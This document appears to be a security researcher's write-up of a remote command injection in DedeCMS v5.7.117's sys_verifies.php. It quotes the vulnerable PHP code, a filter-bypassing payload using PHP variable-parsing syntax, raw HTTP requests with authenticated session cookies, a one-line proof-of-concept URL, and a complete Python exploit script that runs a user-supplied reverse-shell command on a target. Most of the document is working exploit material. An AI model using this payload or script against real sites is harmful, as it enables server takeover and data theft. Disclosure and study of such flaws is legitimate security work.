## DedeCMS v5.7.117 Remote Command Injection

### Description

DedeCMS V5.7.117 has a Command Injection in **dede/sys_verifies.php**. 

### CMS_Download

[产品下载 / 织梦 (DedeCMS) 官方网站 - 内容管理系统 - 上海卓卓网络科技有限公司](https://www.dedecms.com/download)
![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505221330019.png)


### 漏洞分析

- In the file dede/sys_verifies.php
![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505221335312.png)

```php
/*-----------------------
下载文件
function _getfiles()
------------------------*/
else if ($action == 'getfiles')
{
    if(!isset($refiles))
    {
        ShowMsg("你没进行任何操作！","sys_verifies.php");
        exit();
    }
    $cacheFiles = DEDEDATA.'/modifytmp.inc';
    $fp = fopen($cacheFiles, 'w');
    fwrite($fp, '<'.'?php'."\r\n");
    fwrite($fp, '$tmpdir = "'.$tmpdir.'";'."\r\n");
    $dirs = array();
    $i = -1;
    $adminDir = preg_replace("#(.*)[\/\\\\]#", "", dirname(__FILE__));
    foreach($refiles as $filename)
    {
        $filename = substr($filename,3,strlen($filename)-3);

        // 不允许这些字符
        $filename = preg_replace("/[\";()]/", '', $filename);

        if(preg_match("#^dede/#i", $filename)) 
        {
            $curdir = GetDirName( preg_replace("#^dede/#i", $adminDir.'/', $filename) );
        } else {
            $curdir = GetDirName($filename);
        }
        if( !isset($dirs[$curdir]) ) 
        {
            $dirs[$curdir] = TestIsFileDir($curdir);
        }
        $i++;
        fwrite($fp, '$files['.$i.'] = "'.$filename.'";'."\r\n");
    }
    fwrite($fp, '$fileConut = '.$i.';'."\r\n");
    fwrite($fp, '?'.'>');
    fclose($fp);
    
    $dirinfos = '';
    if($i > -1)
    {
        $dirinfos = '<tr bgcolor="#ffffff"><td colspan="2">';
        $dirinfos .= "本次升级需要在下面文件夹写入更新文件，请注意文件夹<font color='red'>是否有写入权限：</font><br />\r\n";
        foreach($dirs as $curdir)
        {
            $dirinfos .= $curdir['name']." 状态：".($curdir['writeable'] ? "[√正常]" : "<font color='red'>[×不可写]：请手动创建该目录</font>")."<br />\r\n";
        }
        $dirinfos .= "</td></tr>\r\n";
    }
        
    $doneStr = "<iframe name='stafrm' src='sys_verifies.php?action=down&curfile=0' frameborder='0' id='stafrm' width='100%' height='100%'></iframe>\r\n";
    
    include(DEDEADMIN.'/templets/sys_verifies_getfiles.htm');
    
    exit();
}
```

**Payload:**

```php
17${${print%20`whoami`}}
```

1. **Injection Process:**

   - This payload is submitted to the `getfiles` action of `sys_verifies.php`.
   - After processing, it is written into the `modifytmp.inc` cache file, generating content similar to:

   ```php
   $files[0] = "${${print%20`whoami`}}";
   ```

2. **Variable Parsing Syntax:**

   - `${...}` is PHP's complex variable syntax.
   - The inner `${print%20`whoami`}` is also a variable parsing structure.
   - `%20` is the URL-encoded space.
   - Backticks ``whoami`` execute a system command.

### Trigger

- 
![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505221337659.png)

```php
/*-----------------------
下载文件
function _getfiles()
------------------------*/
else if ($action == 'getfiles')
{
    if(!isset($refiles))
    {
        ShowMsg("你没进行任何操作！","sys_verifies.php");
        exit();
    }
    $cacheFiles = DEDEDATA.'/modifytmp.inc';
    $fp = fopen($cacheFiles, 'w');
    fwrite($fp, '<'.'?php'."\r\n");
    fwrite($fp, '$tmpdir = "'.$tmpdir.'";'."\r\n");
    $dirs = array();
    $i = -1;
    $adminDir = preg_replace("#(.*)[\/\\\\]#", "", dirname(__FILE__));
    foreach($refiles as $filename)
    {
        $filename = substr($filename,3,strlen($filename)-3);

        // 不允许这些字符
        $filename = preg_replace("/[\";()]/", '', $filename);

        if(preg_match("#^dede/#i", $filename)) 
        {
            $curdir = GetDirName( preg_replace("#^dede/#i", $adminDir.'/', $filename) );
        } else {
            $curdir = GetDirName($filename);
        }
        if( !isset($dirs[$curdir]) ) 
        {
            $dirs[$curdir] = TestIsFileDir($curdir);
        }
        $i++;
        fwrite($fp, '$files['.$i.'] = "'.$filename.'";'."\r\n");
    }
    fwrite($fp, '$fileConut = '.$i.';'."\r\n");
    fwrite($fp, '?'.'>');
    fclose($fp);
    
    $dirinfos = '';
    if($i > -1)
    {
        $dirinfos = '<tr bgcolor="#ffffff"><td colspan="2">';
        $dirinfos .= "本次升级需要在下面文件夹写入更新文件，请注意文件夹<font color='red'>是否有写入权限：</font><br />\r\n";
        foreach($dirs as $curdir)
        {
            $dirinfos .= $curdir['name']." 状态：".($curdir['writeable'] ? "[√正常]" : "<font color='red'>[×不可写]：请手动创建该目录</font>")."<br />\r\n";
        }
        $dirinfos .= "</td></tr>\r\n";
    }
        
    $doneStr = "<iframe name='stafrm' src='sys_verifies.php?action=down&curfile=0' frameborder='0' id='stafrm' width='100%' height='100%'></iframe>\r\n";
    
    include(DEDEADMIN.'/templets/sys_verifies_getfiles.htm');
    
    exit();
}
```

When accessing `/dede/sys_verifies.php?action=down&curfile=1`, the system loads the `modifytmp.inc` file for the following reasons:

1. As seen in the code, when `$action=='down'`, the system executes the corresponding branch of code:

   ```php
   else if($action=='down')
   {
       $cacheFiles = DEDEDATA.'/modifytmp.inc';
       require_once($cacheFiles);
       // ...subsequent code
   }
   ```

2. The first operation in this branch is to define the `$cacheFiles` variable, which points to the `modifytmp.inc` file:

   - `DEDEDATA` is a constant defined in DedeCMS, pointing to the data directory.

3. The system then immediately loads this file using the `require_once()` function:

   ```php
   require_once($cacheFiles);
   ```

4. After loading, the code uses variables obtained from `modifytmp.inc`:

   - `$fileConut`: Used to check if all files have been downloaded.
   - `$tmpdir`: Temporary directory name.
   - `$files[$curfile]`: The filename of the current file to be downloaded.

This is the key part of the exploit chain:

1. The previous `getfiles` operation creates a `modifytmp.inc` containing malicious code.
2. When accessing `action=down`, the system includes this file via `require_once()`.
3. The PHP parser executes all PHP code in the file, including our injected malicious instructions.
4. The `curfile=1` parameter causes the system to attempt to access `$files[0]`, triggering our injected code.

This is a typical "file inclusion and exploitation" pattern: first writing malicious code into a file, then inducing the system to load and execute that file.

### Step1

```http
POST /dede/sys_verifies.php HTTP/1.1
Host: www.dede.top
Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=vjtlnq0jvrql4iuveubluted36; _csrf_name_74ae9ccb=0afd0608d1019e243ccd2edfa52c8d53; _csrf_name_74ae9ccb1BH21ANI1AGD297L1FF21LN02BGE1DNG=101e27f26cfdc22e; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=46f5b1c017a14f40; DedeLoginTime=1748391833; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=8c5466a9a07e334a
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Origin: http://www.dede.top
Referer: http://www.dede.top/dede/sys_verifies.php?action=getfiles
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Length: 43

action=getfiles&refiles%5B%5D=xxx$%7B$%7Bprint%60id%60%7D%7D
```

![image-20250528084731526](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505280847888.png)

### And when you input this payload ,the Web will auto get the next HTTP

```http
POST /dede/sys_verifies.php HTTP/1.1
Host: www.dede.top
Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=vjtlnq0jvrql4iuveubluted36; _csrf_name_74ae9ccb=0afd0608d1019e243ccd2edfa52c8d53; _csrf_name_74ae9ccb1BH21ANI1AGD297L1FF21LN02BGE1DNG=101e27f26cfdc22e; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=46f5b1c017a14f40; DedeLoginTime=1748391833; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=8c5466a9a07e334a
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Origin: http://www.dede.top
Referer: http://www.dede.top/dede/sys_verifies.php?action=getfiles
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Length: 43

action=down&curfile=1
```



![image-20250528084804482](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505280848716.png)



### FInal POC

Actually, the final payload is as follows, requiring only a single step. When you send this payload, DedeCMS will automatically trigger a second file request to execute the command.

```
http://www.dede.top/dede/sys_verifies.php?action=getfiles&refiles[]=17${${print`id`}}
```

![image-20250528090510219](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505280905541.png)



### shell_EXP

```python
#!/usr/bin/env python3
import requests
import urllib.parse
import argparse
import sys

def exploit(target_url, cookie_string, reverse_shell_command):
    # Ensure target URL has correct format
    if not target_url.startswith("http"):
        target_url = "http://" + target_url
    if target_url.endswith("/"):
        target_url = target_url[:-1]
    
    # Parse cookies from string
    cookies = {}
    if cookie_string:
        for item in cookie_string.split(';'):
            if item.strip():
                key, value = item.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    # URL encode the command for the payload
    encoded_command = urllib.parse.quote(reverse_shell_command)
    
    # Create the malicious payload
    payload = f"xxx${{${{print%20`{encoded_command}`}}}}"
    
    # Headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.3,en;q=0.2",
        "Referer": f"{target_url}/dede/sys_verifies.php?action=update",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }
    
    print("[*] Sending malicious payload to create modifytmp.inc...")
    
    # Step 1: Create the malicious file
    try:
        create_url = f"{target_url}/dede/sys_verifies.php?action=getfiles&refiles[]={payload}"
        response = requests.get(create_url, cookies=cookies, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print("[+] Payload sent successfully!")
        else:
            print(f"[-] Failed to send payload. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error sending payload: {str(e)}")
        return False
    
    print("[*] Triggering command execution...")
    
    # Step 2: Trigger the command execution
    try:
        trigger_url = f"{target_url}/dede/sys_verifies.php?action=down&curfile=1"
        response = requests.get(trigger_url, cookies=cookies, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print("[+] Command triggered successfully!")
            print("[+] If the command was successful, you should receive your reverse shell.")
            return True
        else:
            print(f"[-] Failed to trigger command. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error triggering command: {str(e)}")
        return False

def main():
    parser = argparse.ArgumentParser(description="DedeCMS sys_verifies.php RCE Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://example.com)")
    parser.add_argument("-c", "--cookies", required=True, help="Cookies for authentication")
    parser.add_argument("-s", "--shell", required=True, help="Reverse shell command to execute")
    
    args = parser.parse_args()
    
    print("[*] DedeCMS sys_verifies.php RCE Exploit")
    print(f"[*] Target: {args.url}")
    
    exploit(args.url, args.cookies, args.shell)

if __name__ == "__main__":
    main()
```


![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505211523675.png)


![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505211523431.png)





